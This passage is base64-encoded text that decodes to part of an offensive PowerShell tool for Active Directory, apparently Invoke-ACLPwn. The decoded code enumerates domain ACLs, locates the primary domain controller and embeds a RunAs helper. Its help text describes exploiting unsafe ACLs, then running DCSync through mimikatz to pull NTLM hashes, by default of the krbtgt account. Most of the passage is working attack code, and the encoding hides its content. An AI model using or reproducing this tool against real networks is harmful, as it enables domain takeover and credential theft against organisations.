5lZWQgdG8gcmVzb2x2ZSBTSURzCiAgICAkcGFydE9mRG9tYWluID0gKEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtKS5QYXJ0T2ZEb21haW4KICAgICRMb29rdXBTSURzID0gJGZhbHNlCiAgICBpZiAoLW5vdCAkcGFydE9mRG9tYWluKSB7CiAgICAgICAgV3JpdGUtU3RhdHVzICdUaGlzIGNvbXB1dGVyIGlzIG5vdCBwYXJ0IG9mIHRoZSB0YXJnZXQgZG9tYWluLiBXaWxsIGxvb2t1cCBTSURzIG1hbnVhbGx5LicKICAgICAgICAkTG9va3VwU0lEcyA9ICR0cnVlCiAgICB9CgoKICAgICMgVGFrZXMgYSB3aGlsZQogICAgJHJlc3VsdHMgPSBAKCkgICAgCiAgICAkZGlyRW50cnkgPSBHZXQtRGlyRW50cnkgLWxkYXBETiAkb2JqZWN0RE4KICAgIAogICAgIyBSZXRyaWV2ZSBBQ0wgZm9yIGRvbWFpbm9iamVjdAogICAgJHJ1bGVUeXBlID0gW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50XQogICAgJGFjY2Vzc1J1bGVzID0gJGRpckVudHJ5LmdldF9PYmplY3RTZWN1cml0eSgpLkdldEFjY2Vzc1J1bGVzKCR0cnVlLCAkdHJ1ZSwgJHJ1bGVUeXBlKQoKICAgICRpQ291bnRlciA9IDAKCiAgICBmb3JlYWNoICgkYWNlIGluICRhY2Nlc3NSdWxlcykgewoKICAgICAgICAkZVIgPSBbc3RyaW5nXTo6RW1wdHkKICAgICAgICAkYXR0cmlidXRlID0gW3N0cmluZ106OkVtcHR5CiAgICAgICAgJGlkZW50aWZ5UmVmZXJlbmNlID0gW3N0cmluZ106OkVtcHR5CgogICAgICAgICMgQ29udmVydCBleHRlbmRlZHJpZ2h0IHRvIHNvbWV0aGluZyByZWFkYWJsZQogICAgICAgIGlmICgkYWNlLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAtZXEgJ0V4dGVuZGVkUmlnaHQnKSB7CiAgICAgICAgICAgICRlUiA9ICgkZ2xvYmFsOkFESW5mby5leHRlbmRlZFJpZ2h0cyB8IFdoZXJlLU9iamVjdCB7JF8uc2NoZW1hSWRHdWlkIC1lcSAkYWNlLk9iamVjdFR5cGV9KS5sZGFwRGlzcGxheU5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7ICAgICAgICAgICAgCiAgICAgICAgICAgICRhdHRyaWJ1dGUgPSAoJGdsb2JhbDpBREluZm8uc2NoZW1hQ2xhc3Nlcy5HZXRFbnVtZXJhdG9yKCkgfCBXaGVyZS1PYmplY3QgeyRfLlZhbHVlLkd1aWQgLWVxICRhY2UuT2JqZWN0VHlwZX0pLk5hbWUKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgIyBHZXQgSUQgcmVmZXJlbmNlCiAgICAgICAgJGlkZW50aWZ5UmVmZXJlbmNlID0gVHJhbnNsYXRlLUlkZW50aXR5UmVmZXJlbmNlICRhY2UuSWRlbnRpdHlSZWZlcmVuY2UuVmFsdWUgLXJlc29sdmUgJExvb2t1cFNJRHMKCiAgICAgICAgJHJlc3VsdHMgKz0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgCiAgICAgICAgICAgICdSaWdodFR5cGUnICAgICAgICAgPSAkYWNlLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cwogICAgICAgICAgICAnQWxsb3cvRGVueScgICAgICAgID0gJGFjZS5BY2Nlc3NDb250cm9sVHlwZQogICAgICAgICAgICAnSWRlbnRpdHlSZWZlcmVuY2UnID0gJGlkZW50aWZ5UmVmZXJlbmNlCiAgICAgICAgICAgICdyYXdJZFJlZicgICAgICAgICAgPSAkYWNlLklkZW50aXR5UmVmZXJlbmNlLlZhbHVlICAgCiAgICAgICAgICAgICdleHRlbmRlZFJpZ2h0JyAgICAgPSAkZVIKICAgICAgICAgICAgJ2F0dHJpYnV0ZScgICAgICAgICA9ICRhdHRyaWJ1dGUKICAgICAgICAgICAgJ0FwcGxpZXMgdG8nICAgICAgICA9ICgkZ2xvYmFsOkFESW5mby5zY2hlbWFDbGFzc2VzIHwgV2hlcmUtT2JqZWN0IHskXy5zY2hlbWFJZEd1aWQgLWVxICRhY2UuSW5oZXJpdGVkT2JqZWN0VHlwZX0pLmxkYXBEaXNwbGF5TmFtZQogICAgICAgIH0KCiAgICAgICAgJGlDb3VudGVyKysKICAgICAgICBXcml0ZS1Qcm9ncmVzcyAtQWN0aXZpdHkgIlBhcnNpbmcgQUNMIGZvciBvYmplY3QgJyRvYmplY3RETicuIFRoaXMgbWF5IHRha2UgYSB3aGlsZS4uIiBgCiAgICAgICAgICAgIC1QZXJjZW50Q29tcGxldGUgJCgkaUNvdW50ZXIgLyAkYWNjZXNzUnVsZXMuQ291bnQgKiAxMDApIGAKICAgICAgICAgICAgLVN0YXR1cyAiUGFyc2luZyBBQ0UgZm9yICQoJGlkZW50aWZ5UmVmZXJlbmNlKSIKICAgIH0KICAgIAogICAgIyBjbGVhbnVwCiAgICAkZGlyRW50cnkuRGlzcG9zZSgpCgogICAgcmV0dXJuIG5ldy1vYmplY3QgUFNPYmplY3QgLXByb3BlcnR5IEB7CiAgICAgICAgJ1BhcnNlZF9yZXN1bHQnID0gJHJlc3VsdHMKICAgICAgICAncmF3X3Jlc3VsdHMnICAgPSAkYWNjZXNzUnVsZXMKICAgIH0KfQoKIyBHZXRzIGRpcmVjdG9yeUVudHJ5IHRvIHN1cHBsaWVkIExEQVBETi4gCmZ1bmN0aW9uIEdldC1EaXJFbnRyeSAoJGxkYXBETikgewogICAgICAgCiAgICAkX2xkYXBETiA9IFtzdHJpbmddOjpFbXB0eQoKICAgICMgQ2hlY2sgaWYgRE4gc3RhcnRzIHdpdGggTERBUDovLyBvciBHQzovLwogICAgaWYgKC1ub3QgKCRsZGFwRE4gLWltYXRjaCAnXig/OmxkYXB8Z2MpXDpcL1wvLisoXGR7MSwzfSk/JykpIHsKICAgICAgICAkX2xkYXBETiA9ICIkKCRnbG9iYWw6bGRhcENvbm5JbmZvLnByb3RvY29sKTovLyQoJGxkYXBETikiCiAgICB9CiAgICBlbHNlIHsKICAgICAgICAkX2xkYXBETiA9ICRsZGFwRE4KICAgIH0KICAgIAogICAgJGF1dGhUeXBlID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BdXRoZW50aWNhdGlvblR5cGVzXTo6U2VjdXJlCiAgICAgICAgICAgIAogICAgaWYgKCRnbG9iYWw6bGRhcENvbm5JbmZvLkludGVncmF0ZWRfTG9naW4pIHsKCiAgICAgICAgJF9kaXJFbnRyeSA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5ICRnbG9iYWw6bGRhcENvbm5JbmZvLkxEQVBDb25uU3RyaW5nICAgICAgICAKICAgIH0KICAgIGVsc2UgewogICAgICAgICRfZGlyRW50cnkgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSAkZ2xvYmFsOmxkYXBDb25uSW5mby5MREFQQ29ublN0cmluZywgJGdsb2JhbDpsZGFwQ29ubkluZm8uVXNlcm5hbWUsICRnbG9iYWw6bGRhcENvbm5JbmZvLlBhc3N3b3JkLCAkYXV0aFR5cGUKICAgIH0KCiAgICAkX2RpckVudHJ5LlBhdGggPSAkX2xkYXBETgogICAgcmV0dXJuICRfZGlyRW50cnkKfQoKIyBHZXQgcHJpbWFyeURDIGZyb20gZG9tYWluCmZ1bmN0aW9uIEdldC1QcmltYXJ5REMgewoKICAgICMgQ29ubmVjdCB0byBBRCwgZmluZCBkb21haW5jb250cm9sbGVyIHdpdGggdGhlIFBEQyBGU01PIHJvbGUKICAgICRkaXJFbnRyeSA9IEdldC1EaXJFbnRyeSAtbGRhcEROICRnbG9iYWw6bGRhcENvbm5JbmZvLkxEQVBDb25uU3RyaW5nCiAgICAkZGlyU2VhcmNoZXIgPSBOZXctb2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkZGlyRW50cnkKICAgICRkaXJTZWFyY2hlci5GaWx0ZXIgPSAnKCYob2JqZWN0Q2xhc3M9ZG9tYWluRE5TKShmU01PUm9sZU93bmVyPSopKScKICAgIFt2b2lkXSRkaXJTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgnZlNNT1JvbGVPd25lcicpCgogICAgJHNSZXN1bHQgPSAkZGlyU2VhcmNoZXIuRmluZE9uZSgpCiAgICAkcmVzdWx0ID0gW3N0cmluZ106OkVtcHR5CiAgICBpZiAoJHNSZXN1bHQpIHsKICAgICAgICAkcm9sZU93bmVyID0gJHNSZXN1bHQuUHJvcGVydGllc1snZlNNT1JvbGVPd25lciddWzBdLlRvU3RyaW5nKCkKICAgICAgICAkcm9sZU93bmVyUGFyZW50ID0gKEdldC1EaXJFbnRyeSAiJHJvbGVPd25lciIpLlBhcmVudCAgICAgICAgCiAgICAgICAgJHBEQ0ZRRE4gPSAoR2V0LURpckVudHJ5ICIkUm9sZU93bmVyUGFyZW50IikuZG5zSG9zdE5hbWUgICAgICAgIAogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtRXJyb3IgJ0ZhaWxlZCB0byByZXRyaWV2ZSBwcmltYXJ5IGRvbWFpbiBjb250cm9sbGVyLiBQbGVhc2UgY2hlY2sgc2NyaXB0XGNvbXB1dGVyIHNldHRpbmdzJwogICAgICAgIHJldHVybgogICAgfSAgICAKCiAgICAkcmVzdWx0ID0gJHBEQ0ZRRE4KCiAgICAjIGNsZWFudXAKICAgIGlmICgtbm90ICRkaXJTZWFyY2hlci5EaXNwb3NlZCkgewogICAgICAgICRkaXJTZWFyY2hlci5EaXNwb3NlKCkKICAgIH0KCiAgICBpZiAoLW5vdCAkZGlyRW50cnkuRGlzcG9zZWQpIHsKICAgICAgICAkZGlyRW50cnkuRGlzcG9zZSgpCiAgICB9CgogICAgcmV0dXJuICRyZXN1bHQKfQoKIyBVc2VzIEFjdGl2ZURpcmVjdG9yeSBuYW1lc3BhY2UgZnJvbSBkaXJlY3RvcnlzZXJ2aWNlcy4gTmV3ZXIKZnVuY3Rpb24gR2V0LVByaW1hcnlEQzM1IHsKCiAgICAkZGlyQ3R4ID0gR2V0LURpcmVjdG9yeUNvbnRleHQgLWN0eFR5cGUgRG9tYWluIC10YXJnZXROYW1lICRnbG9iYWw6bGRhcENvbm5JbmZvLmRvbWFpbgogICAgJGRvbWFpbiA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldERvbWFpbigkZGlyQ3R4KQogICAgJHBkYyA9ICRkb21haW4uUGRjUm9sZU93bmVyLk5hbWUgICAgCgogICAgIyBjbGVhbnVwCiAgICAkZG9tYWluLkRpc3Bvc2UoKQoKICAgIHJldHVybiAkcGRjCn0KCiMgcmV0dXJucyBhdXRoZW50aWNhdGVkIGRpcmVjdG9yeUNvbnRleHQKZnVuY3Rpb24gR2V0LURpcmVjdG9yeUNvbnRleHQgewogICAgcGFyYW0gKAogICAgICAgIFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHRUeXBlXSRjdHhUeXBlID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dFR5cGVdOjpEb21haW4sCiAgICAgICAgW3N0cmluZ10kdGFyZ2V0TmFtZSA9IFtzdHJpbmddOjplbXB0eQogICAgKSAgIAogICAgCiAgICBpZiAoJGdsb2JhbDpsZGFwQ29ubkluZm8uSW50ZWdyYXRlZF9Mb2dpbikgewogICAgICAgICRkaXJDdHggPSBuZXctb2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCAkY3R4VHlwZSwgJHRhcmdldE5hbWUKICAgIH0KICAgIGVsc2UgewogICAgICAgICRkaXJDdHggPSBuZXctb2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCAkY3R4VHlwZSwgJHRhcmdldE5hbWUsCiAgICAgICAgJGdsb2JhbDpsZGFwQ29ubkluZm8udXNlcm5hbWUsICRnbG9iYWw6bGRhcENvbm5JbmZvLlBhc3N3b3JkCiAgICB9ICAgIAoKICAgIHJldHVybiAkZGlyQ3R4Cn0KCiNlbmRyZWdpb24KCiNyZWdpb24gU2NyaXB0RnVuY3Rpb25zCgpmdW5jdGlvbiBHZXQtSGVscCB7CgogICAgJGhlbHBNc2cgPSBAIgoKICAgIFRoaXMgdG9vbCBjYW4gYmUgdXNlZCB0byBjYWxjdWxhdGUgYW5kIGV4cGxvaXQgdW5zYWZlIGNvbmZpZ3VyZWQgQUNMcyBpbiBBY3RpdmUgRGlyZWN0b3J5LgogICAgTW9yZSBpbmZvcm1hdGlvbjogaHR0cHM6Ly9ibG9nLmZveC1pdC5jb20vCgogICAgUmVxdWlyZWQgcGFyYW1ldGVyczoKICAgICAgICBTaGFycEhvdW5kTG9jYXRpb246IGxvY2F0aW9uIG9mIHNoYXJwaG91bmQuZXhlICAgIAoKICAgIE9wdGlvbmFsIHBhcmFtZXRlcnM6CiAgICAgICAgRG9tYWluICAgICAgICAgICAgOiBGUUROIG9mIHRoZSB0YXJnZXQgZG9tYWluCiAgICAgICAgVXNlcm5hbWUgICAgICAgICAgOiBVc2VybmFtZSB0byBhdXRoZW50aWNhdGUgd2l0aAogICAgICAgIFBhc3N3b3JkICAgICAgICAgIDogUGFzc3dvcmQgdG8gYXV0aGVudGljYXRlIHdpdGgKICAgICAgICBXaGF0SWYgICAgICAgICAgICA6IERpc3BsYXlzIG9ubHkgdGhlIGFjdGlvbiB0aGUgc2NyaXB0IGludGVuZHMgdG8gZG8uIE5vIGV4cGxvaXRhdGlvbi4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFjY2VzcyBhcyB3ZWxsIGFzIHBvdGVudGlhbCBhY2Nlc3Mgd2lsbCBpbmNyZWFzZSBpZiB0aGUgdXNlciBhY2NvdW50IGlzIGFkZGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0byBzZWN1cml0eSBncm91cHMsIHNvIHRoZSByZXN1bHQgb2YgdGhpcyBzd2l0Y2ggbWF5IGxvb2sgaW5jb21wbGV0ZS4KICAgICAgICBOb1NlY0NsZWFudXAgICAgICA6IEJ5IGRlZmF1bHQsIHRoZSB1c2VyIHdpbGwgYmUgcmVtb3ZlZCBmcm9tIHRoZSBBQ0wgYW5kIHRoZSBncm91cHMgdGhhdCB3ZXJlIGFkZGVkIGR1cmluZyBydW50aW1lIHdoZW4gdGhlIHNjcmlwdCBpcyBmaW5pc2hlZC4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZXR0aW5nIHRoaXMgc3dpdGNoIHdpbGwgbGVhdmUgdGhhdCBpbiB0YWN0LgogICAgICAgIE5vRENTeW5jICAgICAgICAgIDogV2lsbCBub3QgcnVuIERDU3luYyBhZnRlciBhbGwgbmVjZXNzYXJ5IHN0ZXBzIGhhdmUgYmVlbiB0YWtlbgogICAgICAgIHVzZXJBY2NvdW50VG9Qd24gIDogVXNlciBhY2NvdW50IHRvIHJldHJpZXZlIE5UTE0gaGFzaCBvZi4gT25seSBzaW5nbGUgdXNlciBhY2NvdW50cyBzdXBwb3J0ZWQgbm93LiBEZWZhdWx0cyB0byBrcmJ0Z3QgYWNjb3VudC4KICAgICAgICBsb2dUb0ZpbGUgICAgICAgICA6IFN3aXRjaCB0byB3cml0ZSBjb25zb2xlIG91dHB1dCB0byBmaWxlIHdpdGggdGhlIHNhbWUgbmFtZSBhcyBzY3JpcHQuCiAgICAgICAgbWltaUthdHpMb2NhdGlvbiAgOiBsb2NhdGlvbiBvZiBtaW1pa2F0ei5leGUKCgogICAgVGhlIHRvb2wgd2lsbCB1c2UgaW50ZWdyYXRlZCBhdXRoZW50aWNhdGlvbiwgdW5sZXNzIGRvbWFpbiBGUUROLCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgYXJlIHNwZWNpZmllZC4KICAgIFBsZWFzZSBub3RlIHRoYXQgd2hpbGUgcHJvdG9jb2wgYW5kIHBvcnQgYXJlIG9wdGlvbmFsIHBhcmFtZXRlcnMgdG9vLCB0aGV5J3ZlIG5vdCBiZWVuCiAgICBpbmNvcnBvcmF0ZWQgY29tcGxldGVseSB3aXRoaW4gdGhlIHNjcmlwdC4gCgogICAgVXNhZ2U6IC4vSW52b2tlLUFDTC5wczEgLW1pbWlLYXR6TG9jYXRpb24gPGxvY2F0aW9uPiAtU2hhcnBIb3VuZExvY2F0aW9uIDxsb2NhdGlvbj5gcmBuICAgCiJACgogICAgV3JpdGUtSG9zdCAkaGVscE1zZwp9CgpmdW5jdGlvbiBJbnZva2UtQ2xlYW51cCB7CgogICAgIyBSZW1vdmVzIGZpbGVzIHRoYXQgd2VyZSBjcmVhdGVkCiAgICBXcml0ZS1TdGF0dXMgJ1JlbW92aW5nIGZpbGVzLi4uJwogICAgJGdsb2JhbDpmaWxlc0NyZWF0ZWQgfCBTb3J0LU9iamVjdCAtdW5pcXVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICRfIC1Gb3JjZQogICAgfQoKICAgICMgUmVtb3ZlIEFDRSdzCiAgICBpZiAoLW5vdCAkZ2xvYmFsOk5vU2VjQ2xlYW51cCl7CiAgICAgICAgV3JpdGUtU3RhdHVzICJSZW1vdmluZyBBQ0VzLi4uIgogICAgICAgIFJlbW92ZS1SZXBsaWNhdGlvblBhcnRuZXIKICAgIH0KCiAgICAjIFJlbW92ZSBncm91cG1lbWJlcnNoaXAsIExJRk8KICAgIGlmICgtbm90ICRnbG9iYWw6Tm9TZWNDbGVhbnVwKXsKICAgICAgICBmb3IgKCRpID0gJGdsb2JhbDpHcm91cEFkZGVkLkNvdW50IC0xOyAkaSAtZ2UgMDsgJGktLSl7CiAgICAgICAgICAgICRyZXMgPSBTZXQtR3JvdXBNZW1iZXJzaGlwIC1ncm91cEROICRnbG9iYWw6R3JvdXBBZGRlZFskaV0gLVJlbW92ZSAKICAgICAgICAgICAgaWYgKCRyZXMgLW5lICdEb25lJyl7CiAgICAgICAgICAgICAgICBXcml0ZS1CYWQgIkZhaWxlZCB0byByZW1vdmUgZ3JvdXBtZW1iZXJzaGlwIGZvciBncm91cDogJCgkZ2xvYmFsOkdyb3VwQWRkZWRbJGldKSIKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVN0YXR1cyAiVXNlciByZW1vdmVkIGZyb20gZ3JvdXA6ICQoJGdsb2JhbDpHcm91cEFkZGVkWyRpXSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIFN0YXJ0LVBTU2NyaXB0IChbc3RyaW5nXSRzY3JpcHRMb2MsIFtzdHJpbmddJHNjcmlwdFBhcmFtKSB7CgogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkc2NyaXB0TG9jKSkgewogICAgICAgIFdyaXRlLUJhZCAnU2NyaXB0IG5vdCBmb3VuZCcKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgJHBvd2Vyc2hlbGxQYXRoID0gJ0M6XFdpbmRvd3Ncc3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZScKICAgICRwYXJhbXMgPSAiLWZpbGUgYCIkc2NyaXB0TG9jYCIgLWRvbWFpbiBgIiQoJGdsb2JhbDpsZGFwQ29ubkluZm8uZG9tYWluKWAiIC11c2VybmFtZSBgIiQoJGdsb2JhbDpsZGFwQ29ubkluZm8udXNlcm5hbWUpYCIgLXBhc3N3b3JkIGAiJCgkZ2xvYmFsOmxkYXBDb25uSW5mby5wYXNzd29yZClgIiAkc2NyaXB0UGFyYW0iCgogICAgJHBpbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbwogICAgJHBpbmZvLkZpbGVOYW1lID0gIiRwb3dlcnNoZWxsUGF0aCIKICAgICRwaW5mby5SZWRpcmVjdFN0YW5kYXJkRXJyb3IgPSAkdHJ1ZQogICAgJHBpbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSAkdHJ1ZQogICAgJHBpbmZvLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZQogICAgJHBpbmZvLkFyZ3VtZW50cyA9ICIkcGFyYW1zIgoKICAgICRwID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwogICAgJHAuU3RhcnRJbmZvID0gJHBpbmZvCiAgICAkcC5TdGFydCgpIHwgT3V0LU51bGwKICAgICRwLldhaXRGb3JFeGl0KCkKICAgICRvdXRwdXQgPSAkcC5TdGFuZGFyZE91dHB1dC5SZWFkVG9FbmQoKQogICAgJG91dHB1dCArPSAkcC5TdGFuZGFyZEVycm9yLlJlYWRUb0VuZCgpCgogICAgIyBjbGVhbnVwCiAgICAkcC5EaXNwb3NlKCkKCiAgICByZXR1cm4gJG91dHB1dAp9CgpmdW5jdGlvbiBJbnZva2UtUnVuYXMgewogICAgI3RoeDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Z1enp5U2VjdXJpdHkvUG93ZXJTaGVsbC1TdWl0ZS9tYXN0ZXIvSW52b2tlLVJ1bmFzLnBzMQpQYXJhbSAoCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICAgICBbc3RyaW5nXSRVc2VyLAogICAgICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW3N0cmluZ10kUGFzc3dvcmQsCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICAgICAgW3N0cmluZ10kRG9tYWluPSIuIiwKICAgICAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtzdHJpbmddJEJpbmFyeSwKICAgICAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgICAgICBbc3RyaW5nXSRBcmdzPSRudWxsLAogICAgICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW2ludF1bVmFsaWRhdGVTZXQoMSwyKV0KICAgICAgICAgICAgW3N0cmluZ10kTG9nb25UeXBlCikgIAogICAgCiAgICAgICAgQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAiCiAgICAgICAgdXNpbmcgU3lzdGVtOwogICAgICAgIHVzaW5nIFN5c3RlbS5EaWFnbm9zdGljczsKICAgICAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CiAgICAgICAgdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsKICAgICAgICAKICAgICAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICAgICAgcHVibGljIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhQcm9jZXNzOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3UHJvY2Vzc0lkOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd1RocmVhZElkOwogICAgICAgIH0KICAgICAgICAKICAgICAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICAgICAgcHVibGljIHN0cnVjdCBTVEFSVFVQSU5GTwogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIHVpbnQgY2I7CiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKICAgICAgICAgICAgcHVibGljIHN0cmluZyBscERlc2t0b3A7CiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgbHBUaXRsZTsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdYOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd1k7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3WFNpemU7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3WVNpemU7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3WENvdW50Q2hhcnM7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3WUNvdW50Q2hhcnM7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3RmlsbEF0dHJpYnV0ZTsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdGbGFnczsKICAgICAgICAgICAgcHVibGljIHNob3J0IHdTaG93V2luZG93OwogICAgICAgICAgICBwdWJsaWMgc2hvcnQgY2JSZXNlcnZlZDI7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgbHBSZXNlcnZlZDI7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRPdXRwdXQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZEVycm9yOwogICAgICAgIH0KICAgICAgICAKICAgICAgICBwdWJsaWMgc3RhdGljIGNsYXNzIEFkdmFwaTMyCiAgICAgICAgewogICAgICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSwgQ2hhclNldD1DaGFyU2V0LlVuaWNvZGUpXQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XKAogICAgICAgICAgICAgICAgU3RyaW5nIHVzZXJOYW1lLAogICAgICAgICAgICAgICAgU3RyaW5nIGRvbWFpbiwKICAgICAgICAgICAgICAgIFN0cmluZyBwYXNzd29yZCwKICAgICAgICAgICAgICAgIGludCBsb2dvbkZsYWdzLAogICAgICAgICAgICAgICAgU3RyaW5nIGFwcGxpY2F0aW9uTmFtZSwKICAgICAgICAgICAgICAgIFN0cmluZyBjb21tYW5kTGluZSwKICAgICAgICAgICAgICAgIGludCBjcmVhdGlvbkZsYWdzLAogICAgICAgICAgICAgICAgaW50IGVudmlyb25tZW50LAogICAgICAgICAgICAgICAgU3RyaW5nIGN1cnJlbnREaXJlY3RvcnksCiAgICAgICAgICAgICAgICByZWYgIFNUQVJUVVBJTkZPIHN0YXJ0dXBJbmZvLAogICAgICAgICAgICAgICAgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gcHJvY2Vzc0luZm9ybWF0aW9uKTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcHVibGljIHN0YXRpYyBjbGFzcyBLZXJuZWwzMgogICAgICAgIHsKICAgICAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgR2V0TGFzdEVycm9yKCk7CiAgICAgICAgfQoiQAogICAgICAgIAogICAgICAgICMgU3RhcnR1cEluZm8gU3RydWN0CiAgICAgICAgJFN0YXJ0dXBJbmZvID0gTmV3LU9iamVjdCBTVEFSVFVQSU5GTwogICAgICAgICRTdGFydHVwSW5mby5kd0ZsYWdzID0gMHgwMDAwMDAwMQogICAgICAgICMkU3RhcnR1cEluZm8ud1Nob3dXaW5kb3cgPSAweDAwMDEKICAgICAgICAkU3RhcnR1cEluZm8ud1Nob3dXaW5kb3cgPSAweDAwMDAKICAgICAgICAkU3RhcnR1cEluZm8uY2IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoJFN0YXJ0dXBJbmZvKQogICAgICAgIAogICAgICAgICMgUHJvY2Vzc0luZm8gU3RydWN0CiAgICAgICAgJFByb2Nlc3NJbmZvID0gTmV3LU9iamVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICAgICAgCiAgICAgICAgIyBDcmVhdGVQcm9jZXNzV2l0aExvZ29uVyAtLT4gbHBDdXJyZW50RGlyZWN0b3J5CiAgICAgICAgJEdldEN1cnJlbnRQYXRoID0gKEdldC1JdGVtIC1QYXRoICIuXCIgLVZlcmJvc2UpLkZ1bGxOYW1lCiAgICAgICAgCiAgICAgICAgI2VjaG8gImBuWz5dIENhbGxpbmcgQWR2YXBpMzI6OkNyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIgogICAgICAgICRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6Q3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcoCiAgICAgICAgICAgICRVc2VyLCAkRG9tYWluLCAkUGFzc3dvcmQsICRMb2dvblR5cGUsICRCaW5hcnksCiAgICAgICAgICAgICRBcmdzLCAweDA0MD